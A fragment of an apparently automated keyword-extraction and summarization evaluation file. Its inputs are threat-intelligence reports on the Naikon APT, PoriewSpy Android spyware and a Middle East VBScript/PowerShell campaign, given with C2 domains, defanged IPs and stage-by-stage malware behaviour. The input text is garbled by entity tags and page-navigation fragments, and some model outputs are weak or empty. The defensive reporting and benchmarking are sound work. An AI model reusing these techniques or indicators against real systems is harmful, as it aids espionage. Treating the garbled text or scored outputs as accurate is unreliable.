Backdoor.Win32.Agent.bjer Backdoor.Win32.Agent.dcyv Backdoor.Win32.Agent.dfbk [ORG] Backdoor.Win32.Agent.dgpd [ORG] Backdoor . Win32.Zegost . * [PERSON] Backdoor.Win32.Zegost.aekr [PERSON] Trojan . Win32.Agent . * Trojan.Win32.Agent.acflt Trojan.Win32.Agent.acfma Trojan.Win32.Agent.adddt Trojan.Win32.Agent.hofz Trojan.Win32.Agent.siai Trojan.Win32.Agent.spde Trojan.Win32.Agent.tlhi [PERSON] Trojan.Win32.Agent.tpbo [PERSON] Trojan.Win32.Agent.unhn [PERSON] Trojan . [GPE] Win32.Agent.xikpTrojan . Win32.Agentb . * Trojan.Win32.Agentb.bbca Trojan.Win32.Agentb.bphx Trojan.Win32.Agentb.iqj Trojan.Win32.Agentb.jwp [ORG] Trojan - Downloader . Win32.Agent . * Trojan-Downloader.Win32.Agent.gxqe Trojan-Downloader.Win32.Agent.zzrd [ORG] Trojan - Spy . Win32.Agent . * Trojan-Spy.Win32.Agent.chrj Trojan-Spy.Win32.Agent.chuq Trojan-Spy.Win32.Agent.cibn Trojan-Spy.Win32.Agent.cicz Trojan-Spy.Win32.Agent.ciet Trojan-Spy.Win32.Agent.cifj Trojan-Spy.Win32.Agent.ciry Trojan-Spy.Win32.Agent.ciiu Trojan-Spy.Win32.Agent.cita Trojan-Spy.Win32.Agent.cjez Trojan-Spy.Win32.Agent.cjkg Trojan-Spy.Win32.Agent.cjmv Trojan . Win32.Pincav . * Trojan.Win32.Pincav.cngx Trojan . Win32.Sasfis . * [PERSON] Trojan.Win32.Sasfis.dmmt [PERSON] Trojan - Dropper . MSIL.Agent . * Trojan-Dropper.MSIL.Agent.aidh [PERSON] Trojan - Dropper . Win32.Dycler . * Trojan-Dropper.Win32.Dycler.ssr Trojan-Dropper.Win32.Dycler.sss Trojan - Dropper . Win32.Injector . * Trojan-Dropper.Win32.Injector.jujl Trojan-Dropper.Win32.Injector.kblf Trojan-Dropper.Win32.Injector.kbre [GPE] Trojan . Win32.Zapchast . * Trojan.Win32.Zapchast.aerrTrojan.Win32.Zapchast.aest Trojan.Win32.Zapchast.aetr Trojan.Win32.Zapchast.aety [PRODUCT] Trojan.Win32.Zapchast.aevb Trojan.Win32.Zapchast.aevg Trojan.Win32.Zapchast.afma Trojan.Win32.Zapchast.afcz HEUR : Trojan . Win32.Generic [PERSON] HEUR : Trojan . Win32.Invader Appendix C : Md5 [PERSON] Reference [PERSON] Set [PERSON] Appendix [PERSON] D : C2 ( Domain ) [PERSON] Reference [PERSON] Set [PERSON] ahzx.eicp.net [PERSON] bkav.imshop.in googlemm.vicp.net mncgn.51vip.biz myanmartech.vicp.net thailand.vicp.net ubaoyouxiang.gicp.net vietnam.gnway.net For full indicator and other details , please contact intelreports@kaspersky.com", "generated_text": "port; campaigns; Myanmar; Vietnam; Singapore; Laos; Malaysia; the Philippines; teams; naikon; systems; spear-phishing techniques; 2; stage; tools; the group; CVE-2012-0158; exploitation; attachments; a custom network; service scanner; a custom pdf binding tool; the toolset; the group; social engineering; attacks; end; the tools; the CVE-2012-0158 exploit; tools; sslMM; xsControl; plugins; this Group; group; malicious software; the infrastructure; tools; infrastructure; detection; data; The group; tactics; tactics; point; a targeted attack; Japan; South Korea; Cambodia; Thailand; Singapore; Japan; the region; tools.", "ref_text": "<START-1>The document discusses the campaigns and tools used by a threat actor group referred to as the Naikon APT. This group has conducted cyber espionage campaigns targeting organizations in Southeast Asia, particularly ASEAN nations, since around 2009. The group has used various backdoors and malware tools over the years, many with \"MM\" in their names, such as MsnMM, WinMM, WininetMM. These tools have shared code, functionality, infrastructure, and targeting focuses. The group has relied heavily on spear-phishing to deliver its malware, using exploits for Microsoft Office and decoy documents relevant to its targets. The PDF examines the group's earliest campaigns, under the codename MsnMM, and traces the evolution of its tools over time. It provides technical analysis of malware samples like SslMM, WinMM, Inject, and Sakto/WininetMM. The group's later campaigns employed more sophisticated backdoors like Naikon/xsPlus and Rarstone. The report highlights the shared code, infrastructure, and targeting between the MsnMM and later Naikon campaigns. Both used the same exploit kit to generate malware. They shared domains and IP addresses for command and control. The spear-phishing content and decoys align with an ASEAN focus. Victim organizations have included government, military, law enforcement, media, and energy sector entities in Vietnam, Myanmar, Singapore, Malaysia, Philippines, and elsewhere. The report concludes the Naikon APT is a persistent, prolific cyber espionage actor focused on the South China Sea region. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.48539325842696635, "gpt3/lexical/rouge_rouge2": 0.08126410835214447, "gpt3/lexical/rouge_rougeL": 0.2202247191011236, "gpt3/lexical/rouge_rougeLsum": 0.2202247191011236, "gpt3_generated_text": ["The article discusses the Naikon APT campaign, which has been active for several years. The campaign appears to focus on specific countries, using specific toolsets and backdoors. The group behind the campaign has also deployed a set of second stage tools, mixing legitimate system administration tools with offensive network reconnaissance tools. The Naikon attackers have used various tactics, including spear-phishing techniques, to gain access to victim systems. The group has also tested and used freely-distributed tools, such as TeamViewer, for anti-malware evasion. The attackers have been precise in social engineering their targets, collecting data such as full names, email addresses, and previous communications. The early campaigns targeted victims primarily in Myanmar, Vietnam, Singapore, Laos, Malaysia, and the Philippines. The Naikon APT relies on email as an attack vector and has used techniques such as exploit attachments and icon spoofing to compromise victim systems. The group has used multiple backdoors with different behaviors over time, but clusters of indicators have remained consistent. The Naikon APT has also used a kit that generates exploits embedded with backdoors for spear-phishing. The shellcode used in the exploits is designed to evade behavior-based protection and sandbox analysis. Overall, the Naikon APT campaign demonstrates sophisticated tactics and a diverse toolset for targeted attacks in the region."]}, {"split_name": "val", "sample_id": "val_28", "prompt_text": "Extract the keywords: [ORG] Trend [ORG] Micro [ORG] About [ORG] TrendLabs [ORG] Security Intelligence Blog Home Search : CategoriesHome \u00bb Mobile \u00bb Hacking Group Spies on Android Users in [GPE] India Using [ORG] PoriewSpy [ORG] Hacking [ORG] Group [ORG] Spies on Android Users in [GPE] India Using [ORG] PoriewSpy [ORG] Posted on : [DATE] January 29 , [DATE] 2018 at [TIME] 12:00 [TIME] am Posted in : [GPE] Mobile , Targeted Attacks Author : Mobile Threat Response Team0by [PERSON] Ecular [PERSON] Xu and [PERSON] Grey [PERSON] Guo We have been seeing attacks that spy on and steal data from speci\ufb01c targets on the mobile platform since [DATE] late [DATE] 2017 . We discovered the malicious apps victimizing [ORG] Android users in [GPE] India , and believe a hacking group \u2014 [CARDINAL] one previously known for victimizing government of\ufb01cials \u2014 carried out the attacks . We identi\ufb01ed these malicious apps as [ORG] PoriewSpy ( detected by [ORG] Trend [ORG] Micro as ANDROIDOS_PORIEWSPY.HRX ) . We also suspect that the group used malicious apps built using [ORG] DroidJack or SandroRAT ( detected as ANDROIDOS_SANRAT.A ) , based on similarities in their command - and - control ( [ORG] C&C ) server . [PERSON] DroidJack is a remote access [PERSON] Trojan ( RAT ) that allows intruders to take full control of a user \u2019s Android device when installed . The operators behind these malicious apps might be related to a suspected cyberespionage group discovered in [DATE] 2016 , but it \u2019s possible that the group may be launching different attacks unrelated to their previous campaign . [ORG] PoriewSpy turns device into an audio recorder , steals other device info Existing as far back as [DATE] 2014 , [ORG] PoriewSpy steals sensitive information from victims \u2019 devices such as [ORG] SMS , call logs , contacts , location , and SD card \ufb01le list . It can also record victims \u2019 voice calls . The malware was developed from an open - source project called android - swipe - image - viewer , or [ORG] Android [ORG] Image [ORG] Viewer , which the malware operator / s modi\ufb01ed to add the following components : Permissions android.permission . INTERNET android.permission . RECORD_AUDIO android.permission . ACCESS_NETWORK_STATE Allows applications to access information about networks android.permission . READ_SMS android.permission . READ_LOGS android.permission . GET_ACCOUNTS android.permission . READ_CONTACTS android.permission . READ_CALL_LOG android.permission . READ_PHONE_STATE android.permission . WRITE_EXTERNAL_STORA [ORG] GE android.permission . READ_EXTERNAL_STORAG E android.permission . RECEIVE_BOOT_COMPLETE DAllows applications to read SMS messages Allows applications to read the low - level system log \ufb01les Allows access to the list of accounts in [ORG] the [ORG] Accounts [ORG] Service [ORG] Allows applications to read the user \u2019s contacts data Allows applications to read the user \u2019s call log . Allows read only access to phone state Allows applications to write to external storage . Allows applications to open network sockets Allows applications to record audioAllows applications to read from external storage . Allows applications to receive the ACTION_BOOT_COMPLETED that is broadcast after the system \ufb01nishes booting Allows applications to collect battery statisticsandroid.permission . BATTERY_STATS aandroid.permission . ACCESS_FINE_LOCATION Allows applications to access \ufb01ne(e.g . , GPS ) location Allows applications to access information about Wi - Fi android.permission . ACCESS_WIFI_STATE networks Allows applications to access coarse ( e.g. , Cell - ID , [PERSON] WiFi ) locationandroid.permission . ACCESS_COARSE_LOCATIO N android.permission . ACCESS_MOCK_LOCATION Allows applications to create mock location providers forandroid.permission . CHANGE_NETWORK_STATE Allows applications to change network connectivity state android.permission . CHANGE_WIFI_STATEAllows applications to change Wi - Fi [LOC] connectivity statetestingFigure [CARDINAL] 1 . Permissions added by the malware author / s to the modi\ufb01ed [ORG] Android [ORG] Image [ORG] Viewer added by theServices [ORG] PoriewSpy apps were automatically downloaded from malicious websites visited by users . When the malicious app is launched , it will initially show nude photos of an [NORP] Indian actress , but will later hide its icon to obscure itself from users \u2019 sight . When the user calls using an infected device , the malware will start recording the audio , which it saves to /sdcard/.googleplay.security/ named as \u201c _ VoiceCall _ \u201d + currentTime . It can also turn the mobile device into an audio recorder to timely record audio [TIME] every [TIME] 60 [TIME] seconds even when the user is not having a phone call.malware author / s to the modi\ufb01edMain espionage component For log collection [ORG] Audio recordAuto start after device reboot For device power connect action [PERSON] Handle [PERSON] Call actions Handle device network actions [PERSON] Handle [PERSON] Camera related actionsFigure [CARDINAL] 3 . Code snippet of malware performing of\ufb02ine audio recording on user deviceApart from secretly recording audio using the affected device , the malware can also write and steal contacts , [ORG] SMS , call logs , and location information . Figure [CARDINAL] 4 . Code snippet of malware stealing contacts from user deviceFigure [CARDINAL] 5 . Code snippet of malware stealing SMS content from user deviceFigure [CARDINAL] 6 . Code snippet of malware stealing call logs from user deviceFigure [CARDINAL] 7 . Code snippet of malware accessing url to steal the user device\u2019slocation related to its [ORG] IP address . Note : the malware can still compromise the user even when theyare outside [GPE] India or [LOC] South [LOC] Asia . Figure [CARDINAL] 8 . Code snippet of malware stealing location information from user device through GPS ornetworkIn our research , we also found a malicious app , named after an [NORP] Indian model - actress , which bears similarities to the code of [ORG] PoriewSpy apps . Created in [DATE] 2014 , we speculate that this is an earlier version of [ORG] PoriewSpy that also shares the same [ORG] C&C server with some of the latest ones . The malicious app is capable of stealing call logs , contacts , [ORG] SMS , SD card \ufb01le list , and audio recording . Figure [CARDINAL] 9 . Left : Con\ufb01guration code of the seemingly earlier version of [ORG] PoriewSpy . Right : Con\ufb01guration code of the latest version of [ORG] PoriewSpy . Malicious apps developed using [WORK_OF_ART] DroidJack [WORK_OF_ART] Apps built using [PRODUCT] DroidJack also appear to have been used by the hacking group behind [ORG] PoriewSpy , based on the [ORG] C&C servers they share . The operators disguised these [ORG] DroidJack - built apps as freeCall , BatterySavor , [ORG] Secure_Comm , and Nexus_Compatability . The malicious apps are capable of obtaining all necessary permissions for an [ORG] Android device \u2019s main functions , including accessing , modifying , and executing calls , SMS , phonebook , camera , audio recorder , as well as enable or disable Wi - Fi connectivity . The [ORG] C&C servers of [ORG] PoriewSpy and [ORG] DroidJack - built apps Some of [ORG] PoriewSpy \u2019s [ORG] C&C servers were located at 5[.]189[.]137[.]8 and [CARDINAL] 5[.]189[.]145[.]248 , while some of the [ORG] DroidJack - built apps \u2019 were at 93[.]104[.]213[.]217 and 88[.]150[.]227[.]71 . Our research revealed that these [CARDINAL] four [ORG] C&C servers were previously used by a hacking group who allegedly engaged in cyberespionage activities . The abused [ORG] IPs 5[.]189[.]137[.]8 , [CARDINAL] 5[.]189[.]145[.]248 , and 93[.]104[.]213[.]217 can be traced back to a legitimate hosting service provider based in [GPE] Germany . Meanwhile , [CARDINAL] 88[.]150[.]227[.]71 \u2019s is in the [GPE] UK . 62[.]4[.]2[.]211 , the [ORG] C&C server of the initial version of [ORG] PoriewSpy used by some of the latest versions , belongs to a service provider in [GPE] France . The hacking group also used draagon[.]ddns[.]net , located in [LOC] South [LOC] Asia . Figure [CARDINAL] 10 . The chart above shows the connections between the [ORG] C&C servers of [ORG] PoriewSpy and [ORG] DroidJack - built apps , and the suspected cyberespionage group . The green dots represent thecurrent malicious samples . IPs colored in yellow are the ones used by the group in their previouscampaign , while the ones in red are presumably the extension to the mobile platform . The period [ORG] PoriewSpy and [ORG] DroidJack - built apps became active also appear to match that of the hacking group \u2019s campaign . It was observed that the activities of the abovementioned mobile malware became active in [DATE] late [DATE] 2015 to [DATE] early [DATE] 2016 , which was around the same period the hacking group \u2019s campaign was also active . [ORG] Countermeasures [ORG] Targeted attacks on mobile devices may be few compared to ones for desktops or PCs , but the discovery of [ORG] PoriewSpy and other malicious apps that spy on the mobile platform should caution users of the threat that may come their way if their devices remain unsecured . Downloading only from legitimate app stores can prevent [ORG] PoriewSpy and [ORG] DroidJack - built apps from compromising your mobile device . It is also important to be aware of what apps are allowed to access , and to understand the risks before accepting any terms or granting certain permissions to apps . End users and enterprises can also bene\ufb01t from multilayered mobile security solutions such as [ORG] Trend [ORG] Micro \u2122 [ORG] Mobile [ORG] Security for Android \u2122 which is also available on Google Play . For organizations , [ORG] Trend [ORG] Micro \u2122 [ORG] Mobile [ORG] Security [ORG] for [ORG] Enterprise provides device , compliance and application management , data protection , and con\ufb01guration provisioning , as well as protects devices from attacks that leverage vulnerabilities , preventing unauthorized access to apps , as well as detecting and blocking malware and fraudulent websites . [ORG] Trend [ORG] Micro \u2019s [ORG] MARS covers [PERSON] Android and iOS threats using leading sandbox and machine learning technologies . It can protect users against malware , zero - day and known exploits , privacy leaks , andApp [PERSON] Label com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec [FAC] com.sqisland.android.swipe_im [FAC] age_viewer com.sqisland.android.swipe_im age_viewer com.sqisland.anwdroid.sipe_im age_viewer [CARDINAL] com.sqisland.android.swipe_im age_viewer com.sqisland.android.swipe_im age_viewer com.sqisland.android.swipe_im age_viewer net.droidjack.serverapplication vulnerability . We disclosed our \ufb01ndings to [ORG] Google , who stated that none of the abovementioned malicious apps are on Google Play . Updates were made to Google Play Protect to defend against new and existing similar threats . Indicators of Compromise ( IOCs ) [ORG] C&C servers [CARDINAL] 74[.]208[.]102[.]80 5[.]189[.]137[.]8 [CARDINAL] 5[.]189[.]145[.]248 93[.]104[.]213[.]217 draagon[.]ddns[.]net [CARDINAL] 88[.]150[.]227[.]71 62[.]4[.]2[.]211 Related Posts : GhostClicker Adware is a [PERSON] Phantomlike Android Click Fraud Toast [PERSON] Overlay [PERSON] Weaponized to Install Several Android Malware April Android Security Bulletin Addresses Critical H.264 and H.265 Decoder Vulnerabilities Untangling the Patchwork Cyberespionage Groupnet.droidjack.serverSannia_Secrets [NORP] Shivali [ORG] Rastogicom.poonam.pandaynet.droidjack.serverNexus_Compat ability Rabia_Secrets net.droidjack.serverBatterySavor net.droidjack.serverSecure_Comm net.droidjack.serverLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags : PoriewSpyComments for this thread are now closed.0 [PERSON] CommentsTrendLabsRecommend\uf108Share\u2924Login\ue6031 [PERSON] Sort by [ORG] BestSubscribe \u2709 dAdd Disqus to your siteAdd DisqusAddPrivacy Home and Home Of\ufb01ce About Trend Micro Asia Paci\ufb01c Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Latin [LOC] America [LOC] Region ( LAR ): Brasil , [PERSON] M\u00e9xico [PERSON] North America Region ( [ORG] NABU ): [GPE] United [GPE] States , [LOC] Canada [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom [GPE] / [GPE] IrelandPrivacy [GPE] Statement [GPE] Legal Policies Copyright \u00a9 [DATE] 2018 Trend Micro Incorporated . All rights reserved .", "generated_text": "analysis; Trend Micro; the malware; PoriewSpy; Android users; India; late 2017; DroidJack; SandroRAT; similarities; their command-and-control server; Command; control; data; the attackers; Android users; privacy; the malware; a user; Android Image Viewer; Permissions; Indian government; 2016; their previous campaign; security; data; the attack; the attackers.", "ref_text": "<START-1>The PDF describes a malware campaign targeting Android users in India called PoriewSpy. It was discovered in late 2017 and is believed to be created by a hacking group previously known for targeting government officials. PoriewSpy is capable of recording audio, stealing contacts, SMS messages, call logs, location data, and other sensitive information from infected devices. It disguises itself as a nude photo app but then hides its icon. The malware turns the device into an audio recorder, secretly recording the user even when not on a call. The hackers also used separate malicious apps built with the DroidJack RAT that share command and control infrastructure with PoriewSpy. These apps masquerade as legitimate apps and request extensive permissions to fully control the device. The report analyzes the code of PoriewSpy and its evolution over time. It uncovers the IP addresses of the command and control servers, several of which were previously used by the suspected hacking group in cyberespionage campaigns. The PDF provides indicators of compromise and recommendations for mobile security solutions to detect and block similar malware. It highlights that targeted mobile malware attacks are rising and users should only install apps from trustworthy sources and be cautious of permissions requested. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": NaN, "gpt3/lexical/rouge_rouge2": NaN, "gpt3/lexical/rouge_rougeL": NaN, "gpt3/lexical/rouge_rougeLsum": NaN, "gpt3_generated_text": []}, {"split_name": "val", "sample_id": "val_29", "prompt_text": "Extract the keywords: Support CommunitiesSoftwareW E D N E S D AY , F E B R U A R Y 7 , [CARDINAL] 2 0 [CARDINAL] 1 8BACK BACKVulnerability InformationTargeted Attacks In [ORG] The [ORG] Middle [ORG] EastSnort [ORG] Vulnerability [ORG] Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityReputation CenterThis blog post is authored by [PERSON] Paul [PERSON] Rascagneres with assistance of [PERSON] Martin [PERSON] Lee . Razorback IP Blacklist Download Project [PERSON] AspisLibraryEXECUTIVE [PERSON] SUMMARYDaemonlogger AWBO Exercises SpamCopSupport [ORG] CommunitiesTalos has identi ed a targeted attacks affecting [LOC] the [LOC] Middle [LOC] East . This campaign contains the following elements , which are described in detail in this article . Mo owPE - [DATE] SigAboutCareersBlogImmunetMBR FilterTeslacrypt Decryption ToolThe use of allegedly con dential decoy documents purported to be written by the [NORP] Jordanian publishing and research house , [GPE] Dar [GPE] El [GPE] - [GPE] Jaleel . This institute is known for their research of the [NORP] Palestinian - Israeli con ict and the Sunni [NORP] - Shia con ict within [GPE] Iran . The attacker extensively used scripting languages ( [ORG] VBScript , [ORG] PowerShell , [ORG] VBA ) as part of their attack . These scripts are used to dynamically load and execute [ORG] VBScript functions retrieved from a [ORG] Command [ORG] & [ORG] Control server . The attacker demonstrates excellent operational security ( OPSEC ) . The attacker was particularly careful to camou age their infrastructure . During our investigation , the attacker deployed several reconnaissance scripts in order to check the validity of victim machine , blocking systems that do n't meet their criteria . The attacker uses the reputable [ORG] CloudFlare system to hide the nature and location of their infrastructure . Additionally , the attacker   lters connections based on their [LAW] User [LAW] - Agent strings , and only enables their infrastructure for short periods of time before blocking all connections . [PERSON] Synful [PERSON] Knock [PERSON] ScannerFlokibot ToolsLockyDumpFreeSentryFIRSTCisco [ORG] Smart [ORG] Install [ORG] ScannerThis is not the   rst targeted campaign against the region that uses [GPE] Dar [GPE] El [GPE] - [GPE] Jaleel decoy documents which we have investigated . However , we have no indication that the previous campaigns are related . ROPMEMUBASSVBS CAMPAIGNPyREBoxFile2pcapStage [CARDINAL] 1 : VBScript The campaign starts with a [ORG] VBScript named    \u0631            \u0627 \u0646\u0627   \u0627 \u0628      \u0627\u062f    .vbs ( \" From inside [GPE] Iran 's secret war in [GPE] Syria.vbs \" ) . Here are the script contents : [ORG] Mutiny [ORG] FuzzerDeceptSoftwareBACK BACKVulnerability [ORG] InformationThe purpose of this script is to create the [ORDINAL] second stage [ORG] PowerShell script described in the next Email & Web Tra c Reputation Snort CommunityReputation CenterStage 2 : [ORG] PowerShell ScriptClamAV [ORG] Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisLibraryThe goal of the generated [ORG] PowerShell script is to create a [ORG] Microsoft O ce document named [ORG] Report.doc and to open it . Daemonlogger AWBO Exercises SpamCopSupport CommunitiesStage 3 : Office Document With MacrosPE - Sig Here is a screenshot of the O ce document : [CARDINAL] ImmunetAboutMo owCareersBlogTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerThis document purports to be written by [GPE] Dar [GPE] El [GPE] - [GPE] Jaleel . [GPE] Dar [GPE] El [GPE] - [GPE] Jaleel is a publishing and studiesThis document purports to be written by [ORG] Dar [ORG] El [ORG] Jaleel . Dar [GPE] El [GPE] Jaleel is a publishing and studies house based in [GPE] Amman , [GPE] Jordan . This institute is well - known for their research concerning the [NORP] Palestinian - Israeli con ict and the Sunni [NORP] - Shia con ict in [GPE] Iran . Tagged as con dential , the document is an analysis report on [NORP] Iranian activities within the Syrian civil war . SoftwareThis document contains a [ORG] Macro : BACK BACKVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE - SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsThe purpose of this [ORG] Macro in to create a WSF ( Windows Script File )   le and to execute it . [PERSON] Synful [PERSON] Knock ScannerStage 4 : WSF ScriptCisco Smart Install ScannerThe created WSF script is the main part of the infection : ROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV Community The top of the script contains con guration information : [ORG] Reputation [ORG] CenterRazorback [ORG] IP [ORG] Blacklist [ORG] Download [ORG] Project AspisLibrarythe hostname of the [ORG] Command [ORG] & [ORG] Control [ORG] - o ce - update[.]services , the port - 2095 , the [ORG] User - Agent - iq.46- SpamCopMo owSupport CommunitiesAboutThe [ORG] User [ORG] - Agent is used to identify the targets . The [ORG] CC   lters network connections based on this string , only allowing through connections made with authorised [ORG] User [ORG] - Agent strings . ImmunetPE - SigCareersTeslacrypt Decryption ToolThe   rst task of the script is to register the infected system by performing an HTTP request to url ce - update[.]services:2095 / store . Next , the script executes an in nite loop , attempting to contact the /search URI every [TIME] 5 [TIME] seconds in order to download and execute additional payloads . MBR FilterBlogFIRSTAdditional PayloadsLockyDumpThe WSF script receives payloads of [CARDINAL] three types , named s0 , s1 , s2 . The payloads are [ORG] VBScript functions loaded and executed on the   y with the [ORG] ExecuteGlobal ( ) and GetRef ( ) APIs . The only differences between s0,s1 and s2 type payloads are the number of arguments supplied to the executing function . s0 does not require any arguments , s1 accepts [CARDINAL] one argument , and s2 [CARDINAL] two arguments . [PERSON] Synful [PERSON] Knock [PERSON] ScannerFlokibot ToolsFreeSentryThe downloaded payload functions are obfuscated , here is an example of the raw data : [PERSON] Cisco [PERSON] Smart Install ScannerROPMEMUBASSThe   rst element is the function type ( s0 ) , followed by a separator ' -|- ' . The [ORDINAL] second element is the obfuscated function ; this consists of [ORG] ASCII values , separated by ' * ' . For example the above data decodes as : File2pcapPyREBoxDeceptMutiny Fuzzer45 : - 42 : * SoftwareVulnerability InformationReputation CenterLibrary-65 + [CARDINAL] 148 = [CARDINAL] 83 - > \" S \" [CARDINAL] 535 - 419 = 117 - > \" u\"Support CommunitiesBACK Email & Web Tra c Reputation AMP Threat Naming Conventions SpamCopMo owHence , the decoded data is \" -65 + 148 * [CARDINAL] 535 - 418 * \" . Then follows a [ORDINAL] second step , again using ' * ' as a separator . Each mathematical operation is resolved to obtain a new [ORG] ASCII value : Razorback IP Blacklist Download Project AspisThis technique is used to construct a new [ORG] VBScript function . During our investigation we received [CARDINAL] 5 different functions . PE - SigRECONNAISSANCE FUNCTIONSImmunetAboutCareersTeslacrypt Decryption ToolBlogDuring our investigation we received a reconnaissance function [TIME] a [TIME] few [TIME] minutes after the initial compromise . The purpose of the function was to retrieve several pieces of information from the infected system , presumably in order to check if the target is valuable or not ( or [QUANTITY] a [QUANTITY] sandbox [QUANTITY] system).MBR FilterFIRSTFirst , the attacker retrieves the disk volume serial number : LockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUSecondly , the payload retrieves any installed anti - virus software : BASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKThirdly , it obtains the Internet IP address of the infected system by querying ipify.org ( the code includes a hint that the attacker previously used wt smyip.com):Snort [ORG] Vulnerability [ORG] Reports [ORG] Email [ORG] & [ORG] Web Tra c [ORG] Reputation [ORG] Snort [ORG] CommunityVulnerability [ORG] InformationReputation [ORG] CenterLibrarySupport CommunitiesAboutCareersBlogClamAV [ORG] Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE - SigImmunetTeslacrypt Decryption ToolMBR FilterThirdly , it retrieves the computer name , the username , [PRODUCT] the [PRODUCT] Operating [PRODUCT] System and the architecture : [GPE] FIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapAll these data are sent to the previously mentioned CC using the /is - return [ORG] URI . The data are stored in the [ORG] User - Agent separated by \" -|-\" . DeceptSubsequently , we received a [ORDINAL] second reconnaissance function : [ORG] Mutiny FuzzerSoftwareBACK Email & Web Tra c [ORG] Reputation [ORG] Snort CommunityThe function acts to list the drives of the infected system and their type ( internal drive , usb driver etc.)Reputation CenterClamAV [ORG] Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisLibraryPERSISTENCE FUNCTIONSDaemonlogger AWBO Exercises SpamCopSupport [ORG] CommunitiesIn addition to the reconnaissance functions we received [CARDINAL] 2 functions linked to the persistence of the [ORG] WSF script . The   rst script is used to persist , the [ORDINAL] second is used to clean the infected system . Our machine was served this after taking too much time to send a request to the C2 Presumably the attacker determined we were examining their systems and decided to remove the malware to prevent further analysis : AboutImmunetMo owPE - SigCareersBlogTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerPIVOT FUNCTIONFinally , we received a pivot function . The function is the only non - s0 function we obtained during our research . This is a s1 function that takes [CARDINAL] one argument : our research . This is a s1 function that takes [CARDINAL] one argument : [ORG] SoftwareBACK [ORG] BACKHere is the argument : [ORG] Vulnerability [ORG] InformationReputation [ORG] CenterSnort [ORG] Vulnerability [ORG] Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download The purpose is to execute a powershell script : [PERSON] Mo [PERSON] owSupport CommunitiesAboutCareersPE [PERSON] - SigImmunetTeslacrypt [PERSON] Decryption ToolBlogThe [ORG] PowerShell script executes a [ORDINAL] second base64 encoded script . The attacker forces the the system to use the [CARDINAL] 32 bit version of [ORG] Powershell even if the operating system architecture is [CARDINAL] 64 bits . FIRSTMBR FilterFinally we obtain the last [ORG] PowerShell script : FreeSentryLockyDumpFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUThe purpose of this script is to download shellcode from [ORG] 176[.]107[.]185[.]246 [ORG] IP , to map it in memory and to execute it . The attacker takes many precautions before delivering the shellcode , these will be explained in the next chapter . Unfortunately during our investigation we were n't served the anticipated shellcode . PyREBoxBASSAttackers OPSECFile2pcapDeceptMutiny [ORG] FuzzerThe attacker behind this campaign put a lot of effort into protecting its infrastructure and to avoid leaking code to analysts . The   rst [ORG] Command [ORG] & [ORG] Control server is protected by [ORG] CloudFlare . This choice complicates the analysis and tracking of the campaign . Additionally , the attacker   lters on the [ORG] User - Agent ; if your web requests do not   t a speci c pattern , your request will be ignored . During our analysis the attacker was only active during [TIME] the [TIME] morning ( [NORP] Central [NORP] European Timezone ) , similarly the various different payloads were only sent during mornings ( Central)hfdhfhk [WORK_OF_ART] dblhEuropean [WORK_OF_ART] Time ) . When an infected system receives the pivot function , the attacker disables their   rewall for [TIME] a [TIME] few [TIME] minutes to allow this unique [ORG] IP to download the shellcode . Afterwards , the server becomes unreachable . Here is a schema of this work ow : [ORG] SoftwareBACK [ORG] BACKVulnerability [ORG] InformationReputation [ORG] CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE - SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerAdditionally , we saw that the attackers blacklisted some of our speci c User - Agent strings and [ORG] IP addresses used during our investigationCisco Smart Install ScannerThis high level of OPSEC is exceptional even among presumed state sponsored threat actors ROPMEMUBASSLinks with [GPE] Jenxcus ( a.k.a . Houdini / H - Worm)?PyREBoxIf you are familiar with [GPE] Jenxcus ( a.k.a . Houdini / H - Worm ) you should see some similarities between the [ORG] VBScript used during this campaign and this well - known malware : usage of the user - agent to ex ltrate data , reconnaissance techniques etc \u2026 DeceptFile2pcapMutiny FuzzerWe can not tell if the attacker used a new version of [ORG] Jenxcus or if this malware served as the inspiration for their own 